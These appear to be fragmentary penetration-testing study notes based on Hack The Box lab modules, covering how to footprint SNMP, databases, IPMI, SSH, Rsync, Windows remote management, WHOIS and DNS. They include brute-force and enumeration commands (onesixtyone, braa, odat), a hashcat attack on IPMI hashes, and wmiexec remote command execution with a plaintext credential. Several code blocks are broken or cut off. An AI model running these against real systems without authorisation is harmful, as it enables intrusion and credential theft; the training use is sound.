To ensure that SNMP access works across manufacturers and with different client-server combinations, the `Management Information Base` (`MIB`) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one `Object Identifier` (`OID`), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the `Abstract Syntax Notation One` (`ASN.1`) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

#### OID

An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the [Object Identifier Registry](https://www.alvestrand.no/objectid/).

#### SNMPv1

SNMP version 1 (`SNMPv1`) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has `no built-in authentication` mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it `does not support encryption`, meaning that all data is sent in plain text and can be easily intercepted.

#### SNMPv2

SNMPv2 existed in different versions. The version still exists today is `v2c`, and the extension `c` means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the `community string` that provides security is only transmitted in plain text, meaning it has no built-in encryption.

#### SNMPv3

The security has been increased enormously for `SNMPv3` by security features such as `authentication` using username and password and transmission `encryption` (via `pre-shared key`) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than `v2c`.

```


Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use `onesixtyone` and `SecLists` wordlists to identify these community strings.



#### OneSixtyOne

SNMP

```bash
c0derpwner@htb[/htb]$ sudo apt install onesixtyone
c0derpwner@htb[/htb]$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
```

Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists. Creating custom wordlists is not an essential part of this module, but more details can be found in the module [Cracking Passwords With Hashcat](https://academy.hackthebox.com/course/preview/cracking-passwords-with-hashcat).


Once we know a community string, we can use it with [braa](https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.

```bash
c0derpwner@htb[/htb]$ sudo apt install braa
c0derpwner@htb[/htb]$ braa <community string>@<IP>:.1.3.6.*   # Syntax
c0derpwner@htb[/htb]$ braa public@10.129.14.128:.1.3.6.*

10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
10.129.14.128:20ms:.1.3.6.1.2.1.1.4.0:mrb3n@inlanefreight.htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.5.0:htb
10.129.14.128:20ms:.1.3.6.1.2.1.1.6.0:US
10.129.14.128:20ms:.1.3.6.1.2.1.1.7.0:78
...SNIP...
```



Once again, we would like to point out that the independent configuration of the SNMP service will bring us a great variety of different experiences that no tutorial can replace. Therefore, we highly recommend setting up a VM with SNMP, experimenting with it, and trying different configurations. SNMP can be a boon for an I.T. systems administrator as well as a curse for Security analysts and managers alike.



# MySQL

#mysql #mariadb

---

`MySQL` is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the [SQL database language](https://www.w3schools.com/sql/sql_intro.asp). MySQL works according to the `client-server principle` and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension `.sql`, for example, like `wordpress.sql`.

As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user `root`, but a fixed password. We can test this with the following command:


MySQL

```bash
c0derpwner@htb[/htb]$ mysql -u root -h 10.129.14.132

ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)

# MSSQL



[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.

#### MSSQL Clients

[SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) (`SSMS`) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. The image below shows SSMS in action.



MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|


Authentication being set to `Windows Authentication` means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.


This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:

- MSSQL clients not using encryption to connect to the MSSQL server
    
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
    
- Weak & default `sa` credentials. Admins may forget to disable this account

# Oracle TNS



The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.


The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

Let's now use `nmap` to scan the default Oracle TNS listener port.




#### Nmap

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

#### ODAT

Oracle TNS

```bash
c0derpwner@htb[/htb]$ ./odat.py all -s 10.129.204.235

```

As istance we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.



```bash

#### Oracle RDBMS - File Upload

Oracle TNS

```bash

# IPMI

#ipmi


[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI_Basics) (`IPMI`) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:

- Before the OS has booted to modify BIOS settings
- When the host is fully powered down
- Access to a host after a system failure

#### Nmap

IPMI

```bash
c0derpwner@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT

NB:
_The short version: the RAKP protocol in the IPMI specification allows anyone to use IPMI commands to grab a HMAC IPMI password hash that can be cracked offline. Longer explanation follows. Here's a [little Perl program](http://fish2.com/ipmi/tools/rak-the-ripper.pl) that implements it._

I guess you can file this in the ... "well, I don't think there are enough problems with IPMI with this new spec... what else can we do to sabatoge its security?"

Prior to IPMI 2.0 the IPMI specs would encapsulate IP packets using the Remote Management Control Protocol (RMCP.) For 2.0 I can only surmise that they wanted to continue avoid sending the password over the network (at least, most, or some of the time, depending on options), so they introduce RMCP+, which offers "enhanced authentication" and extends IPMI over IP.

Thus RAKP - the RMCP+ Authenticated Key-Exchange Protocol - was born. According to the specification (page 161):

> _RAKP-HMAC-SHA1 uses pre-shared symmetric keys and HMAC-based integrity algorithms to mutually authenticate a remote console to a given managed system and to generate pair-wise unique symmetric keying material that can be used with a number of integrity and confidentiality algorithms to provide protection for RMCP messages._

That sounds pretty good - so how does this work? As an illustration as to its underpinnings, an easy way to trigger RAKP is to use _ipmitool_ like below (the "chassis identify" in the example simply asks the BMC to say what it's identify interval is) - you might note that the password given ("fluffy-wuffy") is invalid, but it doesn't matter, as we're just starting up RAKP, we're not interested in finishing it, and ipmitool requires some password, even if it's wrong:

$ **ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 10.0.0.1 chassis identify**


## Dangerous Settings

If default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command **`hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u`** which tries all combinations of upper case letters and numbers for an eight-character password

# Linux Remote Management Protocols




## SSH

[Secure Shell](https://en.wikipedia.org/wiki/Secure_Shell) (`SSH`) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port `TCP 22`. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known [OpenBSD SSH](https://www.openssh.com/) (`OpenSSH`) server on Linux distributions is an open-source fork of the original and commercial `SSH` server from SSH Communication Security. Accordingly, there are two competing protocols: `SSH-1` and `SSH-2`.

`SSH-2`, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, `SSH-1` is vulnerable to `MITM` attacks, whereas SSH-2 is not.

Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:

1. Password authentication
2. Public-key authentication
3. Host-based authentication
4. Keyboard authentication
5. Challenge-response authentication
6. GSSAPI authentication   [The Frizz HTB](https://app.hackthebox.com/machines/TheFrizz)


## Dangerous Settings

Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:

|**Setting**|**Description**|
|---|---|
|`PasswordAuthentication yes`|Allows password-based authentication.|
|`PermitEmptyPasswords yes`|Allows the use of empty passwords.|
|`PermitRootLogin yes`|Allows to log in as the root user.|
|`Protocol 1`|Uses an outdated version of encryption.|
|`X11Forwarding yes`|Allows X11 forwarding for GUI applications.|
|`AllowTcpForwarding yes`|Allows forwarding of TCP ports.|
|`PermitTunnel`|Allows tunneling.|
|`DebianBanner yes`|Displays a specific banner when logging in.|


## Rsync

[Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port `873` and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.

This [guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.

Let's do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.

#### Scanning for Rsync

Linux Remote Management Protocols

```bash
c0derpwner@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1

#### Enumerating an Open Share

Here we can see a share called `dev`, and we can enumerate it further.

The [R-commands](https://en.wikipedia.org/wiki/Berkeley_r-commands) suite consists of the following programs:

- rcp (`remote copy`)
- rexec (`remote execution`)
- rlogin (`remote login`)
- rsh (`remote shell`)
- rstat
- ruptime
- rwho (`remote who`)

Each command has its intended functionality; however, we will only cover the most commonly abused `r-commands`. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.

| **Command** | **Service Daemon** | **Port** | **Transport Protocol** | **Description**                                                                                                                                                                                                                                                            |

| `rsh`       | `rshd`             | 514      | TCP                    | Opens a shell on a remote machine without a login procedure.

| `rexec`     | `rexecd`           | 512      | TCP                    | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a `username` and `password` through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files. |
| `rlogin`    | `rlogind`          | 513      | TCP                    | Enables a user to log in to a remote host over the network. It works similarly to `telnet` but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files.                                     |

The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.

# Windows Remote Management Protocols

#evil-winrm #wsman #rdp 

Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.

The main components used for remote management of Windows and Windows servers are the following:

- Remote Desktop Protocol (`RDP`)
    
- Windows Remote Management (`WinRM`)
    
- Windows Management Instrumentation (`WMI`)

## RDP

The [Remote Desktop Protocol](https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (`RDP`) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.

For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If [Network Address Translation](https://en.wikipedia.org/wiki/Network_address_translation) (`NAT`) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.

The `Remote Desktop` service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the `Server Manager` and comes with the default setting to allow connections to the service only to hosts with [Network level authentication](https://en.wikipedia.org/wiki/Network_Level_Authentication) (`NLA`).



## Footprinting the Service

Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if `NLA` is enabled on the server or not, the product version, and the hostname.

A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.

```

## WinRM

#evil-winrm 

The Windows Remote Management (`WinRM`) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (`SOAP`) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on `TCP` ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.

Another component that fits WinRM for administration is Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.

Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the `Windows Server 2012` version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.


```bash

## WMI

Windows Management Instrumentation (`WMI`) is Microsoft's implementation and also an extension of the Common Information Model (`CIM`), core functionality of the standardized Web-Based Enterprise Management (`WBEM`) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (`WMIC`). WMI is not a single program but consists of several programs and various databases, also known as repositories.

**The initialization of the WMI communication always takes place on `TCP` port `135`, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) from the Impacket toolkit can be used for this.



```bash
c0derpwner@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

# Web



`Web Reconnaissance` is the foundation of a thorough security assessment. This process involves systematically and meticulously collecting information about a target website or web application. Think of it as the preparatory phase before delving into deeper analysis and potential exploitation. It forms a critical part of the "`Information Gathering`" phase of the Penetration Testing Process.

# WHOIS



WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provide details about IP address blocks and autonomous systems. Think of it as a giant phonebook for the internet, letting you look up who owns or is responsible for various online assets.

WHOIS

```bash
c0derpwner@htb[/htb]$ whois inlanefreight.com

[...]
Domain Name: inlanefreight.com
Registry Domain ID: 2420436757_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrar.amazon
Registrar URL: https://registrar.amazon.com
Updated Date: 2023-07-03T01:11:15Z
Creation Date: 2019-08-05T22:43:09Z
[...]
```

Each WHOIS record typically contains the following information:

- `Domain Name`: The domain name itself (e.g., example.com)
- `Registrar`: The company where the domain was registered (e.g., GoDaddy, Namecheap)
- `Registrant Contact`: The person or organization that registered the domain.
- `Administrative Contact`: The person responsible for managing the domain.
- `Technical Contact`: The person handling technical issues related to the domain.
- `Creation and Expiration Dates`: When the domain was registered and when it's set to expire.
- `Name Servers`: Servers that translate the domain name into an IP address.

## History of WHOIS

The history of WHOIS is intrinsically linked to the vision and dedication of [Elizabeth Feinler](https://en.wikipedia.org/wiki/Elizabeth_J._Feinler), a computer scientist who played a pivotal role in shaping the early internet.

In the 1970s, Feinler and her team at the Stanford Research Institute's Network Information Center (NIC) recognised the need for a system to track and manage the growing number of network resources on the ARPANET, the precursor to the modern internet. Their solution was the creation of the WHOIS directory, a rudimentary yet groundbreaking database that stored information about network users, hostnames, and domain names.

why is so important...


## Scenario 1: Phishing Investigation

An email security gateway flags a suspicious email sent to multiple employees within a company. The email claims to be from the company's bank and urges recipients to click on a link to update their account information. A security analyst investigates the email and begins by performing a WHOIS lookup on the domain linked in the email.

The WHOIS record reveals the following:

- `Registration Date`: The domain was registered just a few days ago.
- `Registrant`: The registrant's information is hidden behind a privacy service.
- `Name Servers`: The name servers are associated with a known bulletproof hosting provider often used for malicious activities.



This combination of factors raises significant red flags for the analyst. The analyst promptly alerts the company's IT department to block the domain and warns employees about the scam.



## Scenario 2: Malware Analysis

A security researcher is analysing a new strain of malware that has infected several systems within a network. The malware communicates with a remote server to receive commands and exfiltrate stolen data. To gain insights into the threat actor's infrastructure, the researcher performs a WHOIS lookup on the domain associated with the command-and-control (C2) server.

The WHOIS record reveals:

- `Registrant`: The domain is registered to an individual using a free email service known for anonymity.
- `Location`: The registrant's address is in a country with a high prevalence of cybercrime.
- `Registrar`: The domain was registered through a registrar with a history of lax abuse policies.


Based on this information, the researcher concludes that the C2 server is likely hosted on a compromised or "bulletproof" server. The researcher then uses the WHOIS data to identify the hosting provider and notify them of the malicious activity.


## Scenario 3: Threat Intelligence Report

A cybersecurity firm tracks the activities of a sophisticated threat actor group known for targeting financial institutions. Analysts gather WHOIS data on multiple domains associated with the group's past campaigns to compile a comprehensive threat intelligence report.

By analysing the WHOIS records, analysts uncover the following patterns:

- `Registration Dates`: The domains were registered in clusters, often shortly before major attacks.
- `Registrants`: The registrants use various aliases and fake identities.
- `Name Servers`: The domains often share the same name servers, suggesting a common infrastructure.
- `Takedown History`: Many domains have been taken down after attacks, indicating previous law enforcement or security interventions.

These insights allow analysts to create a detailed profile of the threat actor's tactics, techniques, and procedures (TTPs). The report includes indicators of compromise (IOCs) based on the WHOIS data, which other organisations can use to detect and block future attacks.


```bash
c0derpwner@htb[/htb]$ whois facebook.com

   Domain Name: FACEBOOK.COM

The WHOIS output for `facebook.com` reveals several key details:

1. `Domain Registration`:
    
    - `Registrar`: RegistrarSafe, LLC
    - `Creation Date`: 1997-03-29
    - `Expiry Date`: 2033-03-30

2. `Domain Owner`:
    
    - `Registrant/Admin/Tech Organization`: Meta Platforms, Inc.
    - `Registrant/Admin/Tech Contact`: Domain Admin
    
    This information identifies Meta Platforms, Inc. as the organization behind `facebook.com`, and "Domain Admin" as the point of contact for domain-related matters. This is consistent with the expectation that Facebook, a prominent social media platform, is owned by Meta Platforms, Inc.
    
3. `Domain Status`:
    
    - `clientDeleteProhibited`, `clientTransferProhibited`, `clientUpdateProhibited`, `serverDeleteProhibited`, `serverTransferProhibited`, and `serverUpdateProhibited`
    
    These statuses indicate that the domain is protected against unauthorized changes, transfers, or deletions on both the client and server sides. This highlights a strong emphasis on security and control over the domain.
    
4. `Name Servers`:
    
    - `A.NS.FACEBOOK.COM`, `B.NS.FACEBOOK.COM`, `C.NS.FACEBOOK.COM`, `D.NS.FACEBOOK.COM`
    
    These name servers are all within the `facebook.com` domain, suggesting that Meta Platforms, Inc. manages its DNS infrastructure. It is common practice for large organizations to maintain control and reliability over their DNS resolution.
    

Overall, the WHOIS output for `facebook.com` aligns with expectations for a well-established and secure domain owned by a large organization like Meta Platforms, Inc.

While the WHOIS record provides contact information for domain-related issues, it might not be directly helpful in identifying individual employees or specific vulnerabilities. This highlights the need to combine WHOIS data with other reconnaissance techniques to understand the target's digital footprint comprehensively.


# DNS

---

The `Domain Name System` (`DNS`) acts as the internet's GPS, guiding your online journey from memorable landmarks (domain names) to precise numerical coordinates (IP addresses). 

## How DNS Works

Imagine you want to visit a website like `www.example.com`. You type this friendly domain name into your browser, but your computer doesn't understand words – it speaks the language of numbers, specifically IP addresses. So, how does your computer find the website's IP address? Enter DNS, the internet's trusty translator.

![](https://mermaid.ink/svg/pako:eNptkk1uwjAQha8y8rpcIItWkAAtUNQmlSrksDDxlEQQT-QfJIS4ex2nNG1arzx-n5-ex3NhBUlkEdtr0ZSwSnMFfhm36w425DTEVDfOou60do15XGJxMBCLosQtjEb3MLk8vcCMnJIP156ceA3WFIiYZ6ikgWSdwatDfQZLkKKh4wn1dnBngyZceuQxKYWFNS39jjtTWfyCvdsgb2t9c-wN4-CU_A7dy8mPjFOeYuG0qU4IK6KDa4bgLdjck9ZpZcC_20e7dWmYbRroGU-JLKxFjZCh7h88C_KCv62Sf9RFUJd87GxJurLCtsH-cssuUlfMu8blit2xGnUtKul_-NKKObMl1pizyG-l0Iec5erqOeEsZWdVsMhqh3dMk9uXLPoQR-Mr10hhMamE73L9fYqysqSfuwEKc3T9BOe0sj4)


1. `Your Computer Asks for Directions (DNS Query)`: When you enter the domain name, your computer first checks its memory (cache) to see if it remembers the IP address from a previous visit. If not, it reaches out to a DNS resolver, usually provided by your internet service provider (ISP).
    
2. `The DNS Resolver Checks its Map (Recursive Lookup)`: The resolver also has a cache, and if it doesn't find the IP address there, it starts a journey through the DNS hierarchy. It begins by asking a root name server, which is like the librarian of the internet.
    
3. `Root Name Server Points the Way`: The root server doesn't know the exact address but knows who does – the Top-Level Domain (TLD) name server responsible for the domain's ending (e.g., .com, .org). It points the resolver in the right direction.
    
4. `TLD Name Server Narrows It Down`: The TLD name server is like a regional map. It knows which authoritative name server is responsible for the specific domain you're looking for (e.g., `example.com`) and sends the resolver there.
    
5. `Authoritative Name Server Delivers the Address`: The authoritative name server is the final stop. It's like the street address of the website you want. It holds the correct IP address and sends it back to the resolver.
    
6. `The DNS Resolver Returns the Information`: The resolver receives the IP address and gives it to your computer. It also remembers it for a while (caches it), in case you want to revisit the website soon.
    
7. `Your Computer Connects`: Now that your computer knows the IP address, it can connect directly to the web server hosting the website, and you can start browsing.
    

### The Hosts File

The `hosts` file is a simple text file used to map hostnames to IP addresses, providing a manual method of domain name resolution that bypasses the DNS process. While DNS automates the translation of domain names to IP addresses, the `hosts` file allows for direct, local overrides. This can be particularly useful for development, troubleshooting, or blocking websites.

The `hosts` file is located in `C:\Windows\System32\drivers\etc\hosts` on Windows and in `/etc/hosts` on Linux and MacOS. Each line in the file follows the format:


For example:

```bash
127.0.0.1       localhost
192.168.1.10    devserver.local
```

To edit the `hosts` file, open it with a text editor using administrative/root privileges. Add new entries as needed, and then save the file. The changes take effect immediately without requiring a system restart.

Common uses include redirecting a domain to a local server for development:

Code: txt

```bash
127.0.0.1       myapp.local
```

testing connectivity by specifying an IP address:

Code: txt

```bash
192.168.1.20    testserver.local
```

or blocking unwanted websites by redirecting their domains to a non-existent IP address:

Code: txt

```txt
0.0.0.0       unwanted-site.com
```

### It's Like a Relay Race

Think of the DNS process as a relay race. Your computer starts with the domain name and passes it along to the resolver. The resolver then passes the request to the root server, the TLD server, and finally, the authoritative server, each one getting closer to the destination. Once the IP address is found, it's relayed back down the chain to your computer, allowing you to access the website.

### Key DNS Concepts

In the `Domain Name System` (`DNS`), a `zone` is a distinct part of the domain namespace that a specific entity or administrator manages. Think of it as a virtual container for a set of domain names. For example, `example.com` and all its subdomains (like `mail.example.com` or `blog.example.com`) would typically belong to the same DNS zone.

The zone file, a text file residing on a DNS server, defines the resource records (discussed below) within this zone, providing crucial information for translating domain names into IP addresses.

To illustrate, here's a simplified example of what a zone file, for `example.com` might look like:

Code: zone

```bash
$TTL 3600 ; Default Time-To-Live (1 hour)
@       IN SOA   ns1.example.com. admin.example.com. (
                2024060401 ; Serial number (YYYYMMDDNN)
                3600       ; Refresh interval
                900        ; Retry interval
                604800     ; Expire time
                86400 )    ; Minimum TTL

@       IN NS    ns1.example.com.
@       IN NS    ns2.example.com.
@       IN MX 10 mail.example.com.
www     IN A     192.0.2.1
mail    IN A     198.51.100.1
ftp     IN CNAME www.example.com.
```

This file defines the authoritative name servers (`NS` records), mail server (`MX` record), and IP addresses (`A` records) for various hosts within the `example.com` domain.

DNS servers store various resource records, each serving a specific purpose in the domain name resolution process. Let's explore some of the most common DNS concepts:

|DNS Concept|Description|Example|
|---|---|---|
|`Domain Name`|A human-readable label for a website or other internet resource.|`www.example.com`|
|`IP Address`|A unique numerical identifier assigned to each device connected to the internet.|`192.0.2.1`|
|`DNS Resolver`|A server that translates domain names into IP addresses.|Your ISP's DNS server or public resolvers like Google DNS (`8.8.8.8`)|
|`Root Name Server`|The top-level servers in the DNS hierarchy.|There are 13 root servers worldwide, named A-M: `a.root-servers.net`|
|`TLD Name Server`|Servers responsible for specific top-level domains (e.g., .com, .org).|[Verisign](https://en.wikipedia.org/wiki/Verisign) for `.com`, [PIR](https://en.wikipedia.org/wiki/Public_Interest_Registry) for `.org`|
|`Authoritative Name Server`|The server that holds the actual IP address for a domain.|Often managed by hosting providers or domain registrars.|
|`DNS Record Types`|Different types of information stored in DNS.|A, AAAA, CNAME, MX, NS, TXT, etc.|

Now that we've explored the fundamental concepts of DNS, let's dive deeper into the building blocks of DNS information – the various record types. These records store different types of data associated with domain names, each serving a specific purpose:

|Record Type|Full Name|Description|Zone File Example|
|---|---|---|---|
